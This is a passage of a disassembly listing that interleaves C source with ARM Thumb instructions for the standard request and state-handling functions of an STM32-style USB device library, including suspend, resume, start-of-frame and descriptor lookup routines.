 800b2ce:	2303      	movs	r3, #3
 800b2d0:	73fb      	strb	r3, [r7, #15]
    }
  }
#endif /* USE_USBD_COMPOSITE */

  /* Open EP0 OUT */
  (void)USBD_LL_OpenEP(pdev, 0x00U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b2d2:	2340      	movs	r3, #64	; 0x40
 800b2d4:	2200      	movs	r2, #0
 800b2d6:	2100      	movs	r1, #0
 800b2d8:	6878      	ldr	r0, [r7, #4]
 800b2da:	f001 fbc3 	bl	800ca64 <USBD_LL_OpenEP>
  pdev->ep_out[0x00U & 0xFU].is_used = 1U;
 800b2de:	687b      	ldr	r3, [r7, #4]
 800b2e0:	2201      	movs	r2, #1
 800b2e2:	f8a3 2164 	strh.w	r2, [r3, #356]	; 0x164

  pdev->ep_out[0].maxpacket = USB_MAX_EP0_SIZE;
 800b2e6:	687b      	ldr	r3, [r7, #4]
 800b2e8:	2240      	movs	r2, #64	; 0x40
 800b2ea:	f8c3 2160 	str.w	r2, [r3, #352]	; 0x160

  /* Open EP0 IN */
  (void)USBD_LL_OpenEP(pdev, 0x80U, USBD_EP_TYPE_CTRL, USB_MAX_EP0_SIZE);
 800b2ee:	2340      	movs	r3, #64	; 0x40
 800b2f0:	2200      	movs	r2, #0
 800b2f2:	2180      	movs	r1, #128	; 0x80
 800b2f4:	6878      	ldr	r0, [r7, #4]
 800b2f6:	f001 fbb5 	bl	800ca64 <USBD_LL_OpenEP>
  pdev->ep_in[0x80U & 0xFU].is_used = 1U;
 800b2fa:	687b      	ldr	r3, [r7, #4]
 800b2fc:	2201      	movs	r2, #1
 800b2fe:	849a      	strh	r2, [r3, #36]	; 0x24

  pdev->ep_in[0].maxpacket = USB_MAX_EP0_SIZE;
 800b300:	687b      	ldr	r3, [r7, #4]
 800b302:	2240      	movs	r2, #64	; 0x40
 800b304:	621a      	str	r2, [r3, #32]

  return ret;
 800b306:	7bfb      	ldrb	r3, [r7, #15]
}
 800b308:	4618      	mov	r0, r3
 800b30a:	3710      	adds	r7, #16
 800b30c:	46bd      	mov	sp, r7
 800b30e:	bd80      	pop	{r7, pc}

0800b310 <USBD_LL_SetSpeed>:
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_LL_SetSpeed(USBD_HandleTypeDef *pdev,
                                    USBD_SpeedTypeDef speed)
{
 800b310:	b480      	push	{r7}
 800b312:	b083      	sub	sp, #12
 800b314:	af00      	add	r7, sp, #0
 800b316:	6078      	str	r0, [r7, #4]
 800b318:	460b      	mov	r3, r1
 800b31a:	70fb      	strb	r3, [r7, #3]
  pdev->dev_speed = speed;
 800b31c:	687b      	ldr	r3, [r7, #4]
 800b31e:	78fa      	ldrb	r2, [r7, #3]
 800b320:	741a      	strb	r2, [r3, #16]

  return USBD_OK;
 800b322:	2300      	movs	r3, #0
}
 800b324:	4618      	mov	r0, r3
 800b326:	370c      	adds	r7, #12
 800b328:	46bd      	mov	sp, r7
 800b32a:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b32e:	4770      	bx	lr

0800b330 <USBD_LL_Suspend>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Suspend(USBD_HandleTypeDef *pdev)
{
 800b330:	b480      	push	{r7}
 800b332:	b083      	sub	sp, #12
 800b334:	af00      	add	r7, sp, #0
 800b336:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state != USBD_STATE_SUSPENDED)
 800b338:	687b      	ldr	r3, [r7, #4]
 800b33a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b33e:	b2db      	uxtb	r3, r3
 800b340:	2b04      	cmp	r3, #4
 800b342:	d006      	beq.n	800b352 <USBD_LL_Suspend+0x22>
  {
    pdev->dev_old_state = pdev->dev_state;
 800b344:	687b      	ldr	r3, [r7, #4]
 800b346:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b34a:	b2da      	uxtb	r2, r3
 800b34c:	687b      	ldr	r3, [r7, #4]
 800b34e:	f883 229d 	strb.w	r2, [r3, #669]	; 0x29d
  }

  pdev->dev_state = USBD_STATE_SUSPENDED;
 800b352:	687b      	ldr	r3, [r7, #4]
 800b354:	2204      	movs	r2, #4
 800b356:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c

  return USBD_OK;
 800b35a:	2300      	movs	r3, #0
}
 800b35c:	4618      	mov	r0, r3
 800b35e:	370c      	adds	r7, #12
 800b360:	46bd      	mov	sp, r7
 800b362:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b366:	4770      	bx	lr

0800b368 <USBD_LL_Resume>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_Resume(USBD_HandleTypeDef *pdev)
{
 800b368:	b480      	push	{r7}
 800b36a:	b083      	sub	sp, #12
 800b36c:	af00      	add	r7, sp, #0
 800b36e:	6078      	str	r0, [r7, #4]
  if (pdev->dev_state == USBD_STATE_SUSPENDED)
 800b370:	687b      	ldr	r3, [r7, #4]
 800b372:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b376:	b2db      	uxtb	r3, r3
 800b378:	2b04      	cmp	r3, #4
 800b37a:	d106      	bne.n	800b38a <USBD_LL_Resume+0x22>
  {
    pdev->dev_state = pdev->dev_old_state;
 800b37c:	687b      	ldr	r3, [r7, #4]
 800b37e:	f893 329d 	ldrb.w	r3, [r3, #669]	; 0x29d
 800b382:	b2da      	uxtb	r2, r3
 800b384:	687b      	ldr	r3, [r7, #4]
 800b386:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
  }

  return USBD_OK;
 800b38a:	2300      	movs	r3, #0
}
 800b38c:	4618      	mov	r0, r3
 800b38e:	370c      	adds	r7, #12
 800b390:	46bd      	mov	sp, r7
 800b392:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b396:	4770      	bx	lr

0800b398 <USBD_LL_SOF>:
  * @param  pdev: device instance
  * @retval status
  */

USBD_StatusTypeDef USBD_LL_SOF(USBD_HandleTypeDef *pdev)
{
 800b398:	b580      	push	{r7, lr}
 800b39a:	b082      	sub	sp, #8
 800b39c:	af00      	add	r7, sp, #0
 800b39e:	6078      	str	r0, [r7, #4]
  /* The SOF event can be distributed for all classes that support it */
  if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800b3a0:	687b      	ldr	r3, [r7, #4]
 800b3a2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b3a6:	b2db      	uxtb	r3, r3
 800b3a8:	2b03      	cmp	r3, #3
 800b3aa:	d110      	bne.n	800b3ce <USBD_LL_SOF+0x36>
          }
        }
      }
    }
#else
    if (pdev->pClass[0] != NULL)
 800b3ac:	687b      	ldr	r3, [r7, #4]
 800b3ae:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b3b2:	2b00      	cmp	r3, #0
 800b3b4:	d00b      	beq.n	800b3ce <USBD_LL_SOF+0x36>
    {
      if (pdev->pClass[0]->SOF != NULL)
 800b3b6:	687b      	ldr	r3, [r7, #4]
 800b3b8:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b3bc:	69db      	ldr	r3, [r3, #28]
 800b3be:	2b00      	cmp	r3, #0
 800b3c0:	d005      	beq.n	800b3ce <USBD_LL_SOF+0x36>
      {
        (void)pdev->pClass[0]->SOF(pdev);
 800b3c2:	687b      	ldr	r3, [r7, #4]
 800b3c4:	f8d3 32b8 	ldr.w	r3, [r3, #696]	; 0x2b8
 800b3c8:	69db      	ldr	r3, [r3, #28]
 800b3ca:	6878      	ldr	r0, [r7, #4]
 800b3cc:	4798      	blx	r3
      }
    }
#endif /* USE_USBD_COMPOSITE */
  }

  return USBD_OK;
 800b3ce:	2300      	movs	r3, #0
}
 800b3d0:	4618      	mov	r0, r3
 800b3d2:	3708      	adds	r7, #8
 800b3d4:	46bd      	mov	sp, r7
 800b3d6:	bd80      	pop	{r7, pc}

0800b3d8 <USBD_CoreFindIF>:
  * @param  pdev: device instance
  * @param  index : selected interface number
  * @retval index of the class using the selected interface number. OxFF if no class found.
  */
uint8_t USBD_CoreFindIF(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b3d8:	b480      	push	{r7}
 800b3da:	b083      	sub	sp, #12
 800b3dc:	af00      	add	r7, sp, #0
 800b3de:	6078      	str	r0, [r7, #4]
 800b3e0:	460b      	mov	r3, r1
 800b3e2:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b3e4:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b3e6:	4618      	mov	r0, r3
 800b3e8:	370c      	adds	r7, #12
 800b3ea:	46bd      	mov	sp, r7
 800b3ec:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b3f0:	4770      	bx	lr

0800b3f2 <USBD_CoreFindEP>:
  * @param  pdev: device instance
  * @param  index : selected endpoint number
  * @retval index of the class using the selected endpoint number. 0xFF if no class found.
  */
uint8_t USBD_CoreFindEP(USBD_HandleTypeDef *pdev, uint8_t index)
{
 800b3f2:	b480      	push	{r7}
 800b3f4:	b083      	sub	sp, #12
 800b3f6:	af00      	add	r7, sp, #0
 800b3f8:	6078      	str	r0, [r7, #4]
 800b3fa:	460b      	mov	r3, r1
 800b3fc:	70fb      	strb	r3, [r7, #3]
  return 0xFFU;
#else
  UNUSED(pdev);
  UNUSED(index);

  return 0x00U;
 800b3fe:	2300      	movs	r3, #0
#endif /* USE_USBD_COMPOSITE */
}
 800b400:	4618      	mov	r0, r3
 800b402:	370c      	adds	r7, #12
 800b404:	46bd      	mov	sp, r7
 800b406:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b40a:	4770      	bx	lr

0800b40c <USBD_GetEpDesc>:
  * @param  pConfDesc:  pointer to Bos descriptor
  * @param  EpAddr:  endpoint address
  * @retval pointer to video endpoint descriptor
  */
void *USBD_GetEpDesc(uint8_t *pConfDesc, uint8_t EpAddr)
{
 800b40c:	b580      	push	{r7, lr}
 800b40e:	b086      	sub	sp, #24
 800b410:	af00      	add	r7, sp, #0
 800b412:	6078      	str	r0, [r7, #4]
 800b414:	460b      	mov	r3, r1
 800b416:	70fb      	strb	r3, [r7, #3]
  USBD_DescHeaderTypeDef *pdesc = (USBD_DescHeaderTypeDef *)(void *)pConfDesc;
 800b418:	687b      	ldr	r3, [r7, #4]
 800b41a:	617b      	str	r3, [r7, #20]
  USBD_ConfigDescTypeDef *desc = (USBD_ConfigDescTypeDef *)(void *)pConfDesc;
 800b41c:	687b      	ldr	r3, [r7, #4]
 800b41e:	60fb      	str	r3, [r7, #12]
  USBD_EpDescTypeDef *pEpDesc = NULL;
 800b420:	2300      	movs	r3, #0
 800b422:	613b      	str	r3, [r7, #16]
  uint16_t ptr;

  if (desc->wTotalLength > desc->bLength)
 800b424:	68fb      	ldr	r3, [r7, #12]
 800b426:	885b      	ldrh	r3, [r3, #2]
 800b428:	b29a      	uxth	r2, r3
 800b42a:	68fb      	ldr	r3, [r7, #12]
 800b42c:	781b      	ldrb	r3, [r3, #0]
 800b42e:	b29b      	uxth	r3, r3
 800b430:	429a      	cmp	r2, r3
 800b432:	d920      	bls.n	800b476 <USBD_GetEpDesc+0x6a>
  {
    ptr = desc->bLength;
 800b434:	68fb      	ldr	r3, [r7, #12]
 800b436:	781b      	ldrb	r3, [r3, #0]
 800b438:	b29b      	uxth	r3, r3
 800b43a:	817b      	strh	r3, [r7, #10]

    while (ptr < desc->wTotalLength)
 800b43c:	e013      	b.n	800b466 <USBD_GetEpDesc+0x5a>
    {
      pdesc = USBD_GetNextDesc((uint8_t *)pdesc, &ptr);
 800b43e:	f107 030a 	add.w	r3, r7, #10
 800b442:	4619      	mov	r1, r3
 800b444:	6978      	ldr	r0, [r7, #20]
 800b446:	f000 f81b 	bl	800b480 <USBD_GetNextDesc>
 800b44a:	6178      	str	r0, [r7, #20]

      if (pdesc->bDescriptorType == USB_DESC_TYPE_ENDPOINT)
 800b44c:	697b      	ldr	r3, [r7, #20]
 800b44e:	785b      	ldrb	r3, [r3, #1]
 800b450:	2b05      	cmp	r3, #5
 800b452:	d108      	bne.n	800b466 <USBD_GetEpDesc+0x5a>
      {
        pEpDesc = (USBD_EpDescTypeDef *)(void *)pdesc;
 800b454:	697b      	ldr	r3, [r7, #20]
 800b456:	613b      	str	r3, [r7, #16]

        if (pEpDesc->bEndpointAddress == EpAddr)
 800b458:	693b      	ldr	r3, [r7, #16]
 800b45a:	789b      	ldrb	r3, [r3, #2]
 800b45c:	78fa      	ldrb	r2, [r7, #3]
 800b45e:	429a      	cmp	r2, r3
 800b460:	d008      	beq.n	800b474 <USBD_GetEpDesc+0x68>
        {
          break;
        }
        else
        {
          pEpDesc = NULL;
 800b462:	2300      	movs	r3, #0
 800b464:	613b      	str	r3, [r7, #16]
    while (ptr < desc->wTotalLength)
 800b466:	68fb      	ldr	r3, [r7, #12]
 800b468:	885b      	ldrh	r3, [r3, #2]
 800b46a:	b29a      	uxth	r2, r3
 800b46c:	897b      	ldrh	r3, [r7, #10]
 800b46e:	429a      	cmp	r2, r3
 800b470:	d8e5      	bhi.n	800b43e <USBD_GetEpDesc+0x32>
 800b472:	e000      	b.n	800b476 <USBD_GetEpDesc+0x6a>
          break;
 800b474:	bf00      	nop
        }
      }
    }
  }

  return (void *)pEpDesc;
 800b476:	693b      	ldr	r3, [r7, #16]
}
 800b478:	4618      	mov	r0, r3
 800b47a:	3718      	adds	r7, #24
 800b47c:	46bd      	mov	sp, r7
 800b47e:	bd80      	pop	{r7, pc}

0800b480 <USBD_GetNextDesc>:
  * @param  buf: Buffer where the descriptor is available
  * @param  ptr: data pointer inside the descriptor
  * @retval next header
  */
USBD_DescHeaderTypeDef *USBD_GetNextDesc(uint8_t *pbuf, uint16_t *ptr)
{
 800b480:	b480      	push	{r7}
 800b482:	b085      	sub	sp, #20
 800b484:	af00      	add	r7, sp, #0
 800b486:	6078      	str	r0, [r7, #4]
 800b488:	6039      	str	r1, [r7, #0]
  USBD_DescHeaderTypeDef *pnext = (USBD_DescHeaderTypeDef *)(void *)pbuf;
 800b48a:	687b      	ldr	r3, [r7, #4]
 800b48c:	60fb      	str	r3, [r7, #12]

  *ptr += pnext->bLength;
 800b48e:	683b      	ldr	r3, [r7, #0]
 800b490:	881a      	ldrh	r2, [r3, #0]
 800b492:	68fb      	ldr	r3, [r7, #12]
 800b494:	781b      	ldrb	r3, [r3, #0]
 800b496:	b29b      	uxth	r3, r3
 800b498:	4413      	add	r3, r2
 800b49a:	b29a      	uxth	r2, r3
 800b49c:	683b      	ldr	r3, [r7, #0]
 800b49e:	801a      	strh	r2, [r3, #0]
  pnext = (USBD_DescHeaderTypeDef *)(void *)(pbuf + pnext->bLength);
 800b4a0:	68fb      	ldr	r3, [r7, #12]
 800b4a2:	781b      	ldrb	r3, [r3, #0]
 800b4a4:	461a      	mov	r2, r3
 800b4a6:	687b      	ldr	r3, [r7, #4]
 800b4a8:	4413      	add	r3, r2
 800b4aa:	60fb      	str	r3, [r7, #12]

  return (pnext);
 800b4ac:	68fb      	ldr	r3, [r7, #12]
}
 800b4ae:	4618      	mov	r0, r3
 800b4b0:	3714      	adds	r7, #20
 800b4b2:	46bd      	mov	sp, r7
 800b4b4:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b4b8:	4770      	bx	lr

0800b4ba <SWAPBYTE>:

/** @defgroup USBD_DEF_Exported_Macros
  * @{
  */
__STATIC_INLINE uint16_t SWAPBYTE(uint8_t *addr)
{
 800b4ba:	b480      	push	{r7}
 800b4bc:	b087      	sub	sp, #28
 800b4be:	af00      	add	r7, sp, #0
 800b4c0:	6078      	str	r0, [r7, #4]
  uint16_t _SwapVal;
  uint16_t _Byte1;
  uint16_t _Byte2;
  uint8_t *_pbuff = addr;
 800b4c2:	687b      	ldr	r3, [r7, #4]
 800b4c4:	617b      	str	r3, [r7, #20]

  _Byte1 = *(uint8_t *)_pbuff;
 800b4c6:	697b      	ldr	r3, [r7, #20]
 800b4c8:	781b      	ldrb	r3, [r3, #0]
 800b4ca:	827b      	strh	r3, [r7, #18]
  _pbuff++;
 800b4cc:	697b      	ldr	r3, [r7, #20]
 800b4ce:	3301      	adds	r3, #1
 800b4d0:	617b      	str	r3, [r7, #20]
  _Byte2 = *(uint8_t *)_pbuff;
 800b4d2:	697b      	ldr	r3, [r7, #20]
 800b4d4:	781b      	ldrb	r3, [r3, #0]
 800b4d6:	823b      	strh	r3, [r7, #16]

  _SwapVal = (_Byte2 << 8) | _Byte1;
 800b4d8:	8a3b      	ldrh	r3, [r7, #16]
 800b4da:	021b      	lsls	r3, r3, #8
 800b4dc:	b21a      	sxth	r2, r3
 800b4de:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 800b4e2:	4313      	orrs	r3, r2
 800b4e4:	b21b      	sxth	r3, r3
 800b4e6:	81fb      	strh	r3, [r7, #14]

  return _SwapVal;
 800b4e8:	89fb      	ldrh	r3, [r7, #14]
}
 800b4ea:	4618      	mov	r0, r3
 800b4ec:	371c      	adds	r7, #28
 800b4ee:	46bd      	mov	sp, r7
 800b4f0:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b4f4:	4770      	bx	lr
	...

0800b4f8 <USBD_StdDevReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdDevReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b4f8:	b580      	push	{r7, lr}
 800b4fa:	b084      	sub	sp, #16
 800b4fc:	af00      	add	r7, sp, #0
 800b4fe:	6078      	str	r0, [r7, #4]
 800b500:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b502:	2300      	movs	r3, #0
 800b504:	73fb      	strb	r3, [r7, #15]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b506:	683b      	ldr	r3, [r7, #0]
 800b508:	781b      	ldrb	r3, [r3, #0]
 800b50a:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b50e:	2b40      	cmp	r3, #64	; 0x40
 800b510:	d005      	beq.n	800b51e <USBD_StdDevReq+0x26>
 800b512:	2b40      	cmp	r3, #64	; 0x40
 800b514:	d857      	bhi.n	800b5c6 <USBD_StdDevReq+0xce>
 800b516:	2b00      	cmp	r3, #0
 800b518:	d00f      	beq.n	800b53a <USBD_StdDevReq+0x42>
 800b51a:	2b20      	cmp	r3, #32
 800b51c:	d153      	bne.n	800b5c6 <USBD_StdDevReq+0xce>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      ret = (USBD_StatusTypeDef)pdev->pClass[pdev->classId]->Setup(pdev, req);
 800b51e:	687b      	ldr	r3, [r7, #4]
 800b520:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800b524:	687b      	ldr	r3, [r7, #4]
 800b526:	32ae      	adds	r2, #174	; 0xae
 800b528:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b52c:	689b      	ldr	r3, [r3, #8]
 800b52e:	6839      	ldr	r1, [r7, #0]
 800b530:	6878      	ldr	r0, [r7, #4]
 800b532:	4798      	blx	r3
 800b534:	4603      	mov	r3, r0
 800b536:	73fb      	strb	r3, [r7, #15]
      break;
 800b538:	e04a      	b.n	800b5d0 <USBD_StdDevReq+0xd8>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b53a:	683b      	ldr	r3, [r7, #0]
 800b53c:	785b      	ldrb	r3, [r3, #1]
 800b53e:	2b09      	cmp	r3, #9
 800b540:	d83b      	bhi.n	800b5ba <USBD_StdDevReq+0xc2>
 800b542:	a201      	add	r2, pc, #4	; (adr r2, 800b548 <USBD_StdDevReq+0x50>)
 800b544:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800b548:	0800b59d 	.word	0x0800b59d
 800b54c:	0800b5b1 	.word	0x0800b5b1
 800b550:	0800b5bb 	.word	0x0800b5bb
 800b554:	0800b5a7 	.word	0x0800b5a7
 800b558:	0800b5bb 	.word	0x0800b5bb
 800b55c:	0800b57b 	.word	0x0800b57b
 800b560:	0800b571 	.word	0x0800b571
 800b564:	0800b5bb 	.word	0x0800b5bb
 800b568:	0800b593 	.word	0x0800b593
 800b56c:	0800b585 	.word	0x0800b585
      {
        case USB_REQ_GET_DESCRIPTOR:
          USBD_GetDescriptor(pdev, req);
 800b570:	6839      	ldr	r1, [r7, #0]
 800b572:	6878      	ldr	r0, [r7, #4]
 800b574:	f000 fa3c 	bl	800b9f0 <USBD_GetDescriptor>
          break;
 800b578:	e024      	b.n	800b5c4 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_ADDRESS:
          USBD_SetAddress(pdev, req);
 800b57a:	6839      	ldr	r1, [r7, #0]
 800b57c:	6878      	ldr	r0, [r7, #4]
 800b57e:	f000 fbcb 	bl	800bd18 <USBD_SetAddress>
          break;
 800b582:	e01f      	b.n	800b5c4 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_CONFIGURATION:
          ret = USBD_SetConfig(pdev, req);
 800b584:	6839      	ldr	r1, [r7, #0]
 800b586:	6878      	ldr	r0, [r7, #4]
 800b588:	f000 fc0a 	bl	800bda0 <USBD_SetConfig>
 800b58c:	4603      	mov	r3, r0
 800b58e:	73fb      	strb	r3, [r7, #15]
          break;
 800b590:	e018      	b.n	800b5c4 <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_CONFIGURATION:
          USBD_GetConfig(pdev, req);
 800b592:	6839      	ldr	r1, [r7, #0]
 800b594:	6878      	ldr	r0, [r7, #4]
 800b596:	f000 fcad 	bl	800bef4 <USBD_GetConfig>
          break;
 800b59a:	e013      	b.n	800b5c4 <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_STATUS:
          USBD_GetStatus(pdev, req);
 800b59c:	6839      	ldr	r1, [r7, #0]
 800b59e:	6878      	ldr	r0, [r7, #4]
 800b5a0:	f000 fcde 	bl	800bf60 <USBD_GetStatus>
          break;
 800b5a4:	e00e      	b.n	800b5c4 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_FEATURE:
          USBD_SetFeature(pdev, req);
 800b5a6:	6839      	ldr	r1, [r7, #0]
 800b5a8:	6878      	ldr	r0, [r7, #4]
 800b5aa:	f000 fd0d 	bl	800bfc8 <USBD_SetFeature>
          break;
 800b5ae:	e009      	b.n	800b5c4 <USBD_StdDevReq+0xcc>

        case USB_REQ_CLEAR_FEATURE:
          USBD_ClrFeature(pdev, req);
 800b5b0:	6839      	ldr	r1, [r7, #0]
 800b5b2:	6878      	ldr	r0, [r7, #4]
 800b5b4:	f000 fd31 	bl	800c01a <USBD_ClrFeature>
          break;
 800b5b8:	e004      	b.n	800b5c4 <USBD_StdDevReq+0xcc>

        default:
          USBD_CtlError(pdev, req);
 800b5ba:	6839      	ldr	r1, [r7, #0]
 800b5bc:	6878      	ldr	r0, [r7, #4]
 800b5be:	f000 fd88 	bl	800c0d2 <USBD_CtlError>
          break;
 800b5c2:	bf00      	nop
      }
      break;
 800b5c4:	e004      	b.n	800b5d0 <USBD_StdDevReq+0xd8>

    default:
      USBD_CtlError(pdev, req);
 800b5c6:	6839      	ldr	r1, [r7, #0]
 800b5c8:	6878      	ldr	r0, [r7, #4]
 800b5ca:	f000 fd82 	bl	800c0d2 <USBD_CtlError>
      break;
 800b5ce:	bf00      	nop
  }

  return ret;
 800b5d0:	7bfb      	ldrb	r3, [r7, #15]
}
 800b5d2:	4618      	mov	r0, r3
 800b5d4:	3710      	adds	r7, #16
 800b5d6:	46bd      	mov	sp, r7
 800b5d8:	bd80      	pop	{r7, pc}
 800b5da:	bf00      	nop

0800b5dc <USBD_StdItfReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdItfReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b5dc:	b580      	push	{r7, lr}
 800b5de:	b084      	sub	sp, #16
 800b5e0:	af00      	add	r7, sp, #0
 800b5e2:	6078      	str	r0, [r7, #4]
 800b5e4:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b5e6:	2300      	movs	r3, #0
 800b5e8:	73fb      	strb	r3, [r7, #15]
  uint8_t idx;

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b5ea:	683b      	ldr	r3, [r7, #0]
 800b5ec:	781b      	ldrb	r3, [r3, #0]
 800b5ee:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b5f2:	2b40      	cmp	r3, #64	; 0x40
 800b5f4:	d005      	beq.n	800b602 <USBD_StdItfReq+0x26>
 800b5f6:	2b40      	cmp	r3, #64	; 0x40
 800b5f8:	d852      	bhi.n	800b6a0 <USBD_StdItfReq+0xc4>
 800b5fa:	2b00      	cmp	r3, #0
 800b5fc:	d001      	beq.n	800b602 <USBD_StdItfReq+0x26>
 800b5fe:	2b20      	cmp	r3, #32
 800b600:	d14e      	bne.n	800b6a0 <USBD_StdItfReq+0xc4>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
    case USB_REQ_TYPE_STANDARD:
      switch (pdev->dev_state)
 800b602:	687b      	ldr	r3, [r7, #4]
 800b604:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b608:	b2db      	uxtb	r3, r3
 800b60a:	3b01      	subs	r3, #1
 800b60c:	2b02      	cmp	r3, #2
 800b60e:	d840      	bhi.n	800b692 <USBD_StdItfReq+0xb6>
      {
        case USBD_STATE_DEFAULT:
        case USBD_STATE_ADDRESSED:
        case USBD_STATE_CONFIGURED:

          if (LOBYTE(req->wIndex) <= USBD_MAX_NUM_INTERFACES)
 800b610:	683b      	ldr	r3, [r7, #0]
 800b612:	889b      	ldrh	r3, [r3, #4]
 800b614:	b2db      	uxtb	r3, r3
 800b616:	2b01      	cmp	r3, #1
 800b618:	d836      	bhi.n	800b688 <USBD_StdItfReq+0xac>
          {
            /* Get the class index relative to this interface */
            idx = USBD_CoreFindIF(pdev, LOBYTE(req->wIndex));
 800b61a:	683b      	ldr	r3, [r7, #0]
 800b61c:	889b      	ldrh	r3, [r3, #4]
 800b61e:	b2db      	uxtb	r3, r3
 800b620:	4619      	mov	r1, r3
 800b622:	6878      	ldr	r0, [r7, #4]
 800b624:	f7ff fed8 	bl	800b3d8 <USBD_CoreFindIF>
 800b628:	4603      	mov	r3, r0
 800b62a:	73bb      	strb	r3, [r7, #14]
            if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b62c:	7bbb      	ldrb	r3, [r7, #14]
 800b62e:	2bff      	cmp	r3, #255	; 0xff
 800b630:	d01d      	beq.n	800b66e <USBD_StdItfReq+0x92>
 800b632:	7bbb      	ldrb	r3, [r7, #14]
 800b634:	2b00      	cmp	r3, #0
 800b636:	d11a      	bne.n	800b66e <USBD_StdItfReq+0x92>
            {
              /* Call the class data out function to manage the request */
              if (pdev->pClass[idx]->Setup != NULL)
 800b638:	7bba      	ldrb	r2, [r7, #14]
 800b63a:	687b      	ldr	r3, [r7, #4]
 800b63c:	32ae      	adds	r2, #174	; 0xae
 800b63e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b642:	689b      	ldr	r3, [r3, #8]
 800b644:	2b00      	cmp	r3, #0
 800b646:	d00f      	beq.n	800b668 <USBD_StdItfReq+0x8c>
              {
                pdev->classId = idx;
 800b648:	7bba      	ldrb	r2, [r7, #14]
 800b64a:	687b      	ldr	r3, [r7, #4]
 800b64c:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800b650:	7bba      	ldrb	r2, [r7, #14]
 800b652:	687b      	ldr	r3, [r7, #4]
 800b654:	32ae      	adds	r2, #174	; 0xae
 800b656:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b65a:	689b      	ldr	r3, [r3, #8]
 800b65c:	6839      	ldr	r1, [r7, #0]
 800b65e:	6878      	ldr	r0, [r7, #4]
 800b660:	4798      	blx	r3
 800b662:	4603      	mov	r3, r0
 800b664:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b666:	e004      	b.n	800b672 <USBD_StdItfReq+0x96>
              }
              else
              {
                /* should never reach this condition */
                ret = USBD_FAIL;
 800b668:	2303      	movs	r3, #3
 800b66a:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b66c:	e001      	b.n	800b672 <USBD_StdItfReq+0x96>
              }
            }
            else
            {
              /* No relative interface found */
              ret = USBD_FAIL;
 800b66e:	2303      	movs	r3, #3
 800b670:	73fb      	strb	r3, [r7, #15]
            }

            if ((req->wLength == 0U) && (ret == USBD_OK))
 800b672:	683b      	ldr	r3, [r7, #0]
 800b674:	88db      	ldrh	r3, [r3, #6]
 800b676:	2b00      	cmp	r3, #0
 800b678:	d110      	bne.n	800b69c <USBD_StdItfReq+0xc0>
 800b67a:	7bfb      	ldrb	r3, [r7, #15]
 800b67c:	2b00      	cmp	r3, #0
 800b67e:	d10d      	bne.n	800b69c <USBD_StdItfReq+0xc0>
            {
              (void)USBD_CtlSendStatus(pdev);
 800b680:	6878      	ldr	r0, [r7, #4]
 800b682:	f000 fdf1 	bl	800c268 <USBD_CtlSendStatus>
          }
          else
          {
            USBD_CtlError(pdev, req);
          }
          break;
 800b686:	e009      	b.n	800b69c <USBD_StdItfReq+0xc0>
            USBD_CtlError(pdev, req);
 800b688:	6839      	ldr	r1, [r7, #0]
